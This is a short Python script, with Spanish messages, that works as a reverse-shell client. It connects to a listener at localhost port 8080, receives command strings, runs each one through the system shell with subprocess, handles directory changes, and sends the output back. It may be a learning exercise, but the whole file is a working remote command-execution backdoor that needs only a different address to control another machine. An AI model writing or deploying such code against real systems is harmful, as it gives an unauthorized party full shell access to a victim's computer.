import socket
import subprocess
import os

cliente=socket.socket()
try:
    cliente.connect(("localhost",8080))
    current_dir=os.getcwd()
    print (current_dir)    
    cliente.send("1".encode('utf8'))
    while True:
        comandoBytes=cliente.recv(1024)
        comandodeco=comandoBytes.decode("utf8")
        if(comandodeco[:2]=="cd"):
            os.chdir(comandodeco[3:])
        comando=subprocess.Popen(comandodeco, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cliente.send(comando.stdout.read())
except:
    print ("no se pudo conetar")